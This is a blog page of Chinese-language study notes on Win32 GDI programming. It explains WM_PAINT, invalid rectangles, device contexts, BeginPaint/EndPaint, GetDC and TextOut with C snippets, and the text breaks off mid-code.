<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Cascadia Code:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deutschball.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"万一找到了呢","hits_empty":"你说的 ${query} 我怎么找不着呢 ","hits_stats":"找到了 ${hits} 个结果，用时 ${time} 毫秒"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="dustland">
<meta property="og:type" content="website">
<meta property="og:title" content="dustland">
<meta property="og:url" content="http://deutschball.github.io/impossible/page/7/index.html">
<meta property="og:site_name" content="dustland">
<meta property="og:description" content="dustland">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="dustball">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://deutschball.github.io/impossible/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>dustland</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">dustland</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">dustball in dustland</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container"></div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="algolia-results">
  <div id="algolia-stats"></div>
  <div id="algolia-hits"></div>
  <div id="algolia-pagination" class="algolia-pagination"></div>
</div>

      
    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/deutschball" class="github-corner" title="Follow me on GayHub" aria-label="Follow me on GayHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/08/win32%20chapter4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/08/win32%20chapter4/" class="post-title-link" itemprop="url">win32程序设计-chapter4 设备无关代码</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-08 00:38:00 / Modified: 14:45:36" itemprop="dateCreated datePublished" datetime="2022-08-08T00:38:00+08:00">2022-08-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-sdk-chapter-4-设备无关代码">windows SDK chapter 4
设备无关代码</h1>
<h2 id="绘制和重绘">绘制和重绘</h2>
<p>为什么需要重绘?</p>
<blockquote>
<p>在控制台编程时,输出均以纯文本打印到终端,终端会永远保存输出,自然不需要重绘</p>
<p>但是窗口编程的时候,一个窗口可能被移动到屏幕边界之外或者被其他窗口遮盖,此时这个窗口上的文字就消失了,</p>
<p>系统不会<strong>一直记着</strong>(操作系统有可能临时记住)窗口上画过什么,在哪里画的.当用户再次将这个窗口置于顶层的时候,操作系统就要求程序,将刚才抹去的文字重新打印.这个过程当然也是在消息循环中处理的.</p>
</blockquote>
<p>操作系统怎么发出重绘的要求呢?</p>
<blockquote>
<p>使用WM_PAINT消息</p>
</blockquote>
<h3 id="wm_paint">WM_PAINT</h3>
<p>操作系统什么时候会发出这个WM_PAINT要求呢?</p>
<blockquote>
<p>用户移动窗口,导致原来被遮盖的部分暴露,或者关闭了覆盖该窗口的对话框</p>
<p>用户调整窗口大小</p>
<p>滚动条滚动</p>
<p>程序自己显式调用InvalidateRect或者InvalidateRgn,生成WM_PAINT消息</p>
<p>下拉菜单后收回</p>
<p>只要是程序需要更新客户区的时候,应该自动或者强制发出WM_PAINT消息,绕一个弯集中从事件函数中处理</p>
</blockquote>
<p>操作系统不能记住被覆盖的部分吗?</p>
<blockquote>
<p>少数情况下可以,比如鼠标指针造成的小面积覆盖或者在客户区内拖动图表</p>
</blockquote>
<h3 id="有效矩形和无效矩形">有效矩形和无效矩形</h3>
<p>需要重新绘制的部分成为无效矩形</p>
<p>什么部分需要重新绘制?先前被遮盖现在需要至于顶层的窗口部分,或者先前移出屏幕现在移入屏幕的部分</p>
<p>windows操作系统会为每个打开的窗口维护一个数据结构,该数据结构用来记录该窗口的最小无效区域范围,如果在该窗口重绘之前,在其上又有新的无效矩形则windows取所有无效区域的最小覆盖.如果原来该窗口进程的消息队列中没有有WM_PAINT消息,则发送一条该消息.如果已经有过WM_PAINT则只需要更新操作系统维护的数据结构</p>
<p>什么数据结构?目前未知,需要学习核心编程后获得原理</p>
<h3 id="立刻重绘">立刻重绘</h3>
<p>各种WM消息是有优先级之分的</p>
<p>WM_PAINT重绘消息的优先级就比较低,WM_VSCROLL垂直滚动条消息就比较高</p>
<p>即使消息队列中已经存在了WM_PAINT消息,后来加入一个WM_VSCROLL消息,这个WM_VSCROLL消息也会先被处理.如此优先队列有个好处是,WM_PAINT消息只会存在一条,多次改变之后重绘和每次改变后的重绘,对于人类来说几乎观察不出来,因此WM_PAINT不需要太多</p>
<p>这就有可能导致,程序一直在忙活高优先级的消息处理,WM_PAINT这个消息一直不处理,比如一个有上亿行的数据库,不停拖动滚动条改变垂直视角的时候程序可能一直忙于处理WM_VSCROLL.那么我们看到的窗口就会迟滞.</p>
<p>但是有那种关系户性质的WM_PAINT消息,它不用排队等待被处理,而是被操作系统亲自安排给程序"给我立刻处理WM_PAINT"</p>
<p>调用UpdateWindow(hwnd)函数即可做到这一点</p>
<p>如果调用UpdateWindow函数时,整个客户区都是有效的,那么调用了一个寂寞</p>
<p>否则,即客户区存在无效矩形,UpdateWindow让窗口立刻收到WM_PAINT,由windows操作系统调用窗口过程WndProc函数</p>
<p>当WM_PAINT处理完后,UpdateWindow将控制还给调用者</p>
<p>这就解释了为啥在主函数创建窗口实例,ShowWindow之后,进入消息循环之前,有一次UpdateWindow</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line">UpdateWindow(hwnd);</span><br></pre></td></tr></table></figure>
<p>即使这里不写UpdateWindow(hwnd),通常也能立刻显式窗口.但是就怕WM_PAINT一直排队的情况</p>
<h2 id="gdi">GDI</h2>
<p>graphics device
interface,图形设备接口,负责系统与绘图程序的信息交换</p>
<blockquote>
<p>图形设备,如打印机,屏幕</p>
</blockquote>
<p>GDI负责封装硬件设备,并且向上层提供接口,在代码层面如果需要和图形设备交互,只需要调用接口.</p>
<p>类似于系统调用接口,GDI也允许程序直接访问物理硬件,只能通过"设备环境"抽象接口访问硬件</p>
<blockquote>
<p>举一个GDI的例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WINGDIAPI WINBOOL WINAPI <span class="title function_">TextOutA</span><span class="params">(HDC hdc,<span class="type">int</span> x,<span class="type">int</span> y,LPCSTR lpString,<span class="type">int</span> c)</span>;</span><br><span class="line">WINGDIAPI WINBOOL WINAPI <span class="title function_">TextOutW</span><span class="params">(HDC hdc,<span class="type">int</span> x,<span class="type">int</span> y,LPCWSTR lpString,<span class="type">int</span> c)</span>;</span><br></pre></td></tr></table></figure>
<p><code>TextOut</code>函数的作用是向窗口客户区输出一个字符串,</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr>
<td>hdc</td>
<td>设备环境句柄,几乎所有的GDI函数都以hdc作为第一个参数</td>
</tr>
<tr>
<td>x</td>
<td>开始绘制的客户区相对横坐标</td>
</tr>
<tr>
<td>y</td>
<td>--纵坐标</td>
</tr>
<tr>
<td>lpString</td>
<td>需要输出到客户区的字符串</td>
</tr>
<tr>
<td>c</td>
<td>lpString的长度</td>
</tr>
</tbody>
</table>
</blockquote>
<h3 id="设备环境">设备环境</h3>
<p>设备环境DC是内核维护的数据结构</p>
<p>一个设备环境与一个特定你的显式设备相关联</p>
<p>设备环境的属性包括文本颜色,文本背景色,字体等等</p>
<p>GDI函数可以根据相对于设备环境分成两类,一类是使用HDC真正绘图的函数,另一类是修改HDC的函数</p>
<blockquote>
<p>如果以在纸上画画类比的话,</p>
<p>设备环境就相当于图纸,画笔,图纸下面的桌子,灯光,以及谁来画(决定字体)</p>
<p>真正输出的内容相当于这个特定的人主观画出的东西</p>
</blockquote>
<p>设备环境是一个大结构体,怎么引用他呢?使用指针?不是,使用HDC类型的句柄.</p>
<p>实际上这个句柄也是一个整数,可能是内核维护的设备环境表的下标,反正一个设备环境对应唯一的一个编号,作为句柄索引该设备环境</p>
<h3 id="获取设备环境句柄">获取设备环境句柄</h3>
<h4 id="beginpaintendpaint">BeginPaint/EndPaint</h4>
<p>这一对只应用于处理WM_PAINT消息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  PAINTSTRUCT ps;</span><br><span class="line">  RECT rect;</span><br><span class="line">  HDC hdc;</span><br><span class="line">  <span class="type">static</span> TCHAR szBuffer[<span class="number">128</span>] = TEXT(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">  <span class="keyword">switch</span> (message)</span><br><span class="line">  &#123;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">case</span> WM_PAINT:</span><br><span class="line">      hdc = BeginPaint(hwnd, &amp;ps);<span class="comment">//获取设备环境hdc,并且第二个参数ps中也有相同的hdc</span></span><br><span class="line">      GetClientRect(hwnd, &amp;rect);<span class="comment">//获取当前客户区矩形范围,通过第二个参数返回</span></span><br><span class="line">      DrawText(hdc, szBuffer, <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</span><br><span class="line">          <span class="comment">//使用hdc设备环境,向rect矩形范围内绘制一个单行上下左右都居中的字符串&quot;default&quot;</span></span><br><span class="line">      EndPaint(hwnd, &amp;ps);<span class="comment">//释放ps中保存的hdc(也就是BeginPaint创建的hdc)</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HDC BeginPaint(</span><br><span class="line">  [in]  HWND          hWnd,		//窗口实例句柄</span><br><span class="line">  [out] LPPAINTSTRUCT lpPaint	//</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">BOOL EndPaint(</span><br><span class="line">  [in] HWND              hWnd,</span><br><span class="line">  [in] const LPPAINTSTRUCT lpPaint</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>两个函数的第一个参数均为HWND窗口句柄</p>
<blockquote>
<p>hwnd是啥?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(classType1,</span><br><span class="line">    TEXT(<span class="string">&quot;first class first instance&quot;</span>),</span><br><span class="line">    WS_OVERLAPPEDWINDOW,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    CW_USEDEFAULT,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    hInstance,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br><span class="line">ShowWindow(hwnd, iCmdShow);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>窗口实例的句柄</p>
</blockquote>
<p>第二个参数均为LPPAINTSTRUCT类型</p>
<blockquote>
<p>struct PAINTSTRUCT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPAINTSTRUCT</span> &#123;</span></span><br><span class="line">  HDC hdc;		<span class="comment">//设备环境句柄</span></span><br><span class="line">  WINBOOL fErase;			<span class="comment">//表明背景是否应该被擦除,0为是</span></span><br><span class="line">  RECT rcPaint;		<span class="comment">//指明需要绘制的矩形区域</span></span><br><span class="line">  WINBOOL fRestore;		<span class="comment">//尚未使用,保留</span></span><br><span class="line">  WINBOOL fIncUpdate;		<span class="comment">//尚未使用</span></span><br><span class="line">  BYTE rgbReserved[<span class="number">32</span>];	<span class="comment">//尚未使用</span></span><br><span class="line">&#125; PAINTSTRUCT,*PPAINTSTRUCT,*NPPAINTSTRUCT,*LPPAINTSTRUCT;</span><br></pre></td></tr></table></figure>
<p>第一个成员就是hdc,这和BeginPaint返回的hdc是同一个值,实际上相当于BeginPaint以通过引用返回了一个包含ps的结构体,然后又单独通过返回值返回了hdc句柄.多此一举,只是为了用起来方便</p>
<p>第二个成员表明Windows在返回该结构体的BeginPaint中,是否擦除了无效区域背景,如果擦除了则fErase=0.默认情况下是会自动擦除的.自定以擦除过程可以处理WM_ERASEBKGND消息</p>
<p>注册窗口类WNDCLASS时指定了一个画刷<code>wndclass.hbrBackground=(HBRUSH)GetStockObject(WHITE_BRUSH)</code>,windows将会使用这里指定的画刷擦除无效背景</p>
<p>第三个参数rcPaint定义了无效矩形边界,以像素为单位,相对于客户区左上角的距离</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807094042735.png"
alt="image-20220807094042735" />
<figcaption aria-hidden="true">image-20220807094042735</figcaption>
</figure>
<p>该矩形区域就是需要重绘的区域,也就是调用BeginPaint之后重绘的区域</p>
</blockquote>
<p><code>BeginPaint</code>如果调用成功则返回HDC句</p>
<p><code>EndPaint</code>释放一个HDC句柄,调用成功则返回TRUE</p>
<p>绘图GDI函数的调用要夹在两个函数之间</p>
<p>如果只写这两个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  	PAINTSTRUCT ps;        </span><br><span class="line">hdc = BeginPaint(hwnd, &amp;ps);<span class="comment">//获取设备环境hdc,并且第二个参数ps中也有相同的hdc</span></span><br><span class="line">      EndPaint(hwnd, &amp;ps);<span class="comment">//释放ps中保存的hdc(也就是BeginPaint创建的hdc)</span></span><br></pre></td></tr></table></figure>
<p><code>BeginPaint</code>只会重绘无效矩形部分,也就是第二个参数ps中rcPaint指定的矩形</p>
<p>考虑到客户区有可能是一个圆形或者其他非矩形形状,<strong>一般不管三七二十一将整个客户区重绘一遍</strong>.</p>
<p>这就需要先调用<code>InvalidateRect</code>使得<strong>整个客户区</strong>失效,然后再调用<code>BeingPaint</code>重绘</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">InvalidateRect</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND       hWnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">const</span> RECT *lpRect,</span></span><br><span class="line"><span class="params">  [in] BOOL       bErase</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>第一个参数是窗口句柄</p>
<p>第二个参数是需要无效化的矩形范围,如果是NULL则表示整个客户区</p>
<p>第三个参数决定BeginPaint是否擦除原背景,当bErase=TRUE则擦除原有背景.否则不擦除</p>
</blockquote>
<h4 id="getdcreleasedc">GetDC/ReleaseDC</h4>
<p>处理非WM_PAINT消息时,如果需要绘制客户区,就要调用这一对.</p>
<p>或者只是需要设备环境信息,不需要绘图时,可以调用这一对.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HDC GetDC(</span><br><span class="line">  [in] HWND hWnd		//窗口实例句柄</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">int ReleaseDC(</span><br><span class="line">  [in] HWND hWnd,		</span><br><span class="line">  [in] HDC  hDC		//需要释放的hDC句柄,一定是最近的GetDC获取的那个句柄,两个函数配套使用</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>两个函数的使用一定是在处理同一条消息时配对完成的</p>
<p>GetDC返回的设备句柄可以在整个客户区绘制,但是BeginPaint只允许在失效矩形绘制</p>
<p>GetDC不会将无效矩形有效化.如有需要,显式调用<code>ValidateRect(hwnd,rect)</code>,当rect为NULL则表示整个客户区</p>
<h4 id="getwindowdcreleasewindowdc">GetWindowDC/ReleaseWindowDC</h4>
<p>GetDC绘制的只有客户区,对于窗口标题栏这种非客户区无能为力</p>
<p>GetWindowDC则可以绘制包括客户区,非客户区在内该窗口的所有区域</p>
<p>相应的消息是WM_NCPAINT</p>
<h3 id="gdi绘制函数">GDI绘制函数</h3>
<h4 id="textout">TEXTOUT</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">TextOutA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HDC    hdc,<span class="comment">//GetDC或者BeginPaint返回的hdc句柄</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    x,<span class="comment">//输出在客户区的起始水平位置</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    y,</span></span><br><span class="line"><span class="params">  [in] LPCSTR lpString,<span class="comment">//需要输出的字符串</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    c<span class="comment">//输出字符串长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于x,y坐标</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807101513222.png"
alt="image-20220807101513222" />
<figcaption aria-hidden="true">image-20220807101513222</figcaption>
</figure>
</blockquote>
<h5 id="gettextmatrics获取字体尺寸">GetTextMatrics获取字体尺寸</h5>
<p>系统字体取决于分辨率和字号大小,不能假设字体大小,而是调用函数获取信息,编写设备无关代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagTEXTMETRICA</span> &#123;</span></span><br><span class="line">    LONG tmHeight;<span class="comment">//字体总高度</span></span><br><span class="line">    LONG tmAscent;<span class="comment">//字体基线以上高度</span></span><br><span class="line">    LONG tmDescent;<span class="comment">//字体基线以下高度</span></span><br><span class="line">    LONG tmInternalLeading;<span class="comment">//字体重音符号高度</span></span><br><span class="line">    LONG tmExternalLeading;<span class="comment">//行间距</span></span><br><span class="line">    LONG tmAveCharWidth;<span class="comment">//消息字符加权宽度</span></span><br><span class="line">    LONG tmMaxCharWidth;<span class="comment">//最宽字符宽度</span></span><br><span class="line">    LONG tmWeight;<span class="comment">//字体粗细</span></span><br><span class="line">    LONG tmOverhang;<span class="comment">//为字符串加粗或者斜体额外宽度</span></span><br><span class="line">    LONG tmDigitizedAspectX;</span><br><span class="line">    LONG tmDigitizedAspectY;</span><br><span class="line">    BYTE tmFirstChar;该字体第一个字符的编号</span><br><span class="line">    BYTE tmLastChar;</span><br><span class="line">    BYTE tmDefaultChar;</span><br><span class="line">    BYTE tmBreakChar;</span><br><span class="line">    BYTE tmItalic;</span><br><span class="line">    BYTE tmUnderlined;</span><br><span class="line">    BYTE tmStruckOut;</span><br><span class="line">    BYTE tmPitchAndFamily;<span class="comment">//决定字体是否是等宽字体,最低位为1则变宽,为0则等宽</span></span><br><span class="line">    BYTE tmCharSet;</span><br><span class="line">  &#125; TEXTMETRICA,*PTEXTMETRICA,*NPTEXTMETRICA,*LPTEXTMETRICA;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">GetTextMetricsW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HDC           hdc,</span></span><br><span class="line"><span class="params">  [out] LPTEXTMETRICW lptm</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p><code>GetTextMetricsW</code>第一个参数是一个hdc设备环境句柄,该函数就是返回该hdc设备环境中的字体属性</p>
<p>第二个参数是一个<code>TEXTMETRICA</code>类型的引用,用来承载返回值</p>
<blockquote>
<p>该结构体类型有20个成员,成员意义:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220807102446433.png"
alt="image-20220807102446433" />
<figcaption aria-hidden="true">image-20220807102446433</figcaption>
</figure>
</blockquote>
<h5 id="文本格式化">文本格式化</h5>
<p><code>GetTextMetrics</code>应该什么时候调用呢?</p>
<p>windows运行时,系统字体不会改变,因此<code>GetTextMetircs</code>只需要调用一次,保存下字体属性,一劳永逸</p>
<p>那么啥时候办这个"一劳"呢?在处理<code>WM_CREATE</code>消息时.</p>
<p>为啥在这个时候?<code>WM_CREATE</code>一定是窗口收到的第一条消息,此时窗口还没有输出到桌面,文字都还没打印.机不可失</p>
<blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hwnd = CreateWindow(classType1,</span><br><span class="line">        TEXT(<span class="string">&quot;first class first instance&quot;</span>),</span><br><span class="line">        WS_OVERLAPPEDWINDOW,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        hInstance,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>在创建窗口实例时就会发送WM_CREATE消息</p>
</blockquote>
<p>举个例子,假如要打印多行字符,需要设置好字间距和行间距</p>
<p>字间距好说,就是<code>tmAveCharWidth</code></p>
<p>行间距(这里的行间距指的是上一行字体的顶和下一行字体的顶的距离,包括纯空白的高度)麻烦点,需要<code>tmHeight+tmExternalLeading</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    HDC hdc;<span class="comment">//设备环境句柄</span></span><br><span class="line">    PAINTSTRUCT ps;</span><br><span class="line">    RECT rect;</span><br><span class="line">    TEXTMETRICA tm;<span class="comment">//字体属性结构</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> 